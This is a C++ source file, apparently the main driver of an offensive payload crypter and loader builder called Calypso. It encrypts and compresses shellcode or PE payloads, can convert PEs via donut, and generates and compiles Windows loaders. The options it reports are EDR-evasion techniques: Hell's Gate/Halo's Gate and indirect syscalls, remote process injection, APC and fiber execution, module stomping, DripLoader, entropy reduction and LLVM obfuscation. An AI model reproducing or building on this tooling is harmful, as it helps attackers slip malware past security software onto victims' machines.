#include "calypso/cli.hpp"
#include "calypso/config.hpp"
#include "calypso/payload.hpp"
#include "calypso/pe_parser.hpp"
#include "calypso/crypto.hpp"
#include "calypso/encoding.hpp"
#include "calypso/compression.hpp"
#include "calypso/stub_generator.hpp"
#include "calypso/compiler.hpp"

#include <iostream>
#include <filesystem>
#include <iomanip>

namespace fs = std::filesystem;

static const char* payload_type_str(calypso::PayloadType t) {
    switch (t) {
        case calypso::PayloadType::Shellcode: return "Shellcode";
        case calypso::PayloadType::PE:        return "PE";
        case calypso::PayloadType::CSharp:    return "C# Assembly";
        default: return "Unknown";
    }
}

static const char* cipher_str(calypso::CipherMode c) {
    switch (c) {
        case calypso::CipherMode::AES_ECB: return "AES-256-ECB";
        case calypso::CipherMode::AES_CBC: return "AES-256-CBC";
        case calypso::CipherMode::XOR:     return "XOR";
        case calypso::CipherMode::RC4:     return "RC4";
    }
    return "Unknown";
}

int main(int argc, char* argv[]) {
    calypso::print_banner();

    if (argc < 2) {
        calypso::print_usage();
        return 1;
    }

    auto cfg = calypso::parse_args(argc, argv);

    // Determine stubs directory
    std::string stubs_dir;
    auto exe_path = fs::path(argv[0]).parent_path();
    if (fs::exists(exe_path / "stubs"))
        stubs_dir = (exe_path / "stubs").string();
    else if (fs::exists("stubs"))
        stubs_dir = "stubs";
    else if (fs::exists(exe_path / ".." / "stubs"))
        stubs_dir = (exe_path / ".." / "stubs").string();
    else {
        std::cerr << "[!] Cannot find stubs/ directory. "
                  << "Run from the Calypso project root or set PATH.\n";
        return 1;
    }

    // Step 1: Read payload
    std::cout << "[*] Reading payload: " << cfg.input_file << std::endl;
    auto payload = calypso::read_payload(cfg.input_file, cfg.payload_type);
    cfg.payload_type = payload.type;

    std::cout << "[+] Payload type: " << payload_type_str(payload.type)
              << " (" << payload.data.size() << " bytes)" << std::endl;

    // Step 2: PE-to-shellcode conversion if requested
    if (cfg.pe_to_shellcode && payload.type == calypso::PayloadType::PE) {
        std::cout << "[*] Converting PE to shellcode via donut..." << std::endl;
        std::vector<uint8_t> shellcode;
        if (!calypso::convert_pe_to_shellcode(cfg.input_file, shellcode)) {
            std::cerr << "[!] PE-to-shellcode conversion failed\n";
            return 1;
        }
        payload.data = std::move(shellcode);
        payload.type = calypso::PayloadType::Shellcode;
        cfg.payload_type = calypso::PayloadType::Shellcode;
        std::cout << "[+] Converted to shellcode (" << payload.data.size() << " bytes)\n";
    }

    size_t original_size = payload.data.size();

    // Step 3: Compress
    if (cfg.compression != calypso::CompressionMethod::None) {
        std::cout << "[*] Compressing payload..." << std::endl;
        auto compressed = calypso::compress_payload(payload.data, cfg.compression);
        std::cout << "[+] Compressed: " << payload.data.size() << " -> "
                  << compressed.size() << " bytes ("
                  << (100 - (compressed.size() * 100 / payload.data.size())) << "% reduction)\n";
        payload.data = std::move(compressed);
    }

    // Step 4: Encrypt
    std::cout << "[*] Encrypting with " << cipher_str(cfg.cipher) << "..." << std::endl;
    auto encrypted = calypso::encrypt_payload(payload.data, cfg.key, cfg.cipher);
    auto expanded_key = calypso::expand_key(cfg.key, 32);
    std::cout << "[+] Encrypted: " << encrypted.size() << " bytes\n";
    std::cout << "[+] Key: " << cfg.key << std::endl;

    // Step 5: Generate loader source
    std::cout << "[*] Generating loader source..." << std::endl;
    auto stub = calypso::generate_loader(cfg, encrypted, expanded_key,
                                          original_size, stubs_dir);
    std::cout << "[+] Generated: " << stub.output_path << std::endl;

    if (cfg.source_only) {
        // Copy source to output location
        std::string src_output = cfg.output_file;
        if (src_output.find(".exe") != std::string::npos)
            src_output = src_output.substr(0, src_output.find(".exe")) + ".cpp";
        else if (src_output.find(".dll") != std::string::npos)
            src_output = src_output.substr(0, src_output.find(".dll")) + ".cpp";
        else
            src_output += ".cpp";

        fs::copy_file(stub.output_path, src_output,
                      fs::copy_options::overwrite_existing);
        std::cout << "[+] Source saved to: " << src_output << std::endl;
        std::cout << "[*] Use --source-only was set, skipping compilation.\n";
    } else {

    // Step 6: Detect compiler
    auto compiler = calypso::detect_compiler(cfg.llvm_obfuscate);
    if (compiler.type == calypso::CompilerType::None) {
#ifndef _WIN32
        // On Linux, try cross-compiler
        compiler = calypso::detect_cross_compiler();
        if (compiler.type == calypso::CompilerType::None) {
            std::cerr << "[!] No cross-compiler found. Install mingw-w64:\n"
                      << "    apt install mingw-w64\n"
                      << "    Or use --source-only to emit source without compiling.\n";
            return 1;
        }
#else
        std::cerr << "[!] No C++ compiler found.\n";
        return 1;
#endif
    }

    std::cout << "[*] Using compiler: " << compiler.path << std::endl;

    // Step 7: Compile
    std::cout << "[*] Compiling loader..." << std::endl;
    if (!calypso::compile_loader(cfg, stub.output_path, cfg.output_file, compiler)) {
        std::cerr << "[!] Compilation failed. Use --source-only to debug.\n";
        return 1;
    }

    // Cleanup temp files
    fs::remove(stub.output_path);

    auto file_size = fs::file_size(cfg.output_file);
    std::cout << "\n[+] Success! Output: " << cfg.output_file
              << " (" << file_size << " bytes)\n";
    } // end if/else source_only

    // Print summary
    std::cout << "\n=== Configuration ===\n";
    std::cout << "  Payload:     " << payload_type_str(cfg.payload_type) << "\n";
    std::cout << "  Cipher:      " << cipher_str(cfg.cipher) << "\n";
    std::cout << "  Backend:     " << (cfg.crypto_backend == calypso::CryptoBackend::CNG
                                        ? "CNG" : "tiny-AES") << "\n";
    std::cout << "  Syscall:     " << (cfg.syscall_method == calypso::SyscallMethod::Indirect
                                        ? "Indirect" : cfg.syscall_method == calypso::SyscallMethod::HellsGate
                                        ? "Hell's Gate" : "Halo's Gate") << "\n";
    std::cout << "  Injection:   " << (cfg.injection == calypso::InjectionMethod::Local
                                        ? "Local" : "Remote") << "\n";
    std::cout << "  Format:      " << (cfg.output_format == calypso::OutputFormat::DLL
                                        ? "DLL" : "EXE") << "\n";
    if (cfg.output_format == calypso::OutputFormat::DLL) {
        std::cout << "  Exports:     ";
        if (cfg.dll_exports.empty()) {
            std::cout << "Run";
        } else {
            for (size_t i = 0; i < cfg.dll_exports.size(); i++) {
                if (i > 0) std::cout << ", ";
                std::cout << cfg.dll_exports[i];
            }
        }
        std::cout << "\n";
    }
    {
        const char* exec_str = "Direct";
        switch (cfg.exec_prim) {
            case calypso::ExecutionPrimitive::Thread:   exec_str = "Thread"; break;
            case calypso::ExecutionPrimitive::APC:      exec_str = "APC"; break;
            case calypso::ExecutionPrimitive::Callback: exec_str = "Callback"; break;
            case calypso::ExecutionPrimitive::Fiber:    exec_str = "Fiber (CaroKann)"; break;
            default: break;
        }
        std::cout << "  Execution:   " << exec_str << "\n";
    }
    if (cfg.module_stomp)
        std::cout << "  Allocation:  Module Stomping\n";
    if (cfg.drip_load)
        std::cout << "  Writing:     DripLoader (4KB chunks)\n";
    if (cfg.entropy_reduce)
        std::cout << "  Entropy:     Reduced\n";
    if (cfg.obfuscate)
        std::cout << "  Obfuscation: Source-level + string encryption\n";
    if (cfg.llvm_obfuscate)
        std::cout << "  LLVM:        FLA + SUB + BCF\n";

    return 0;
}
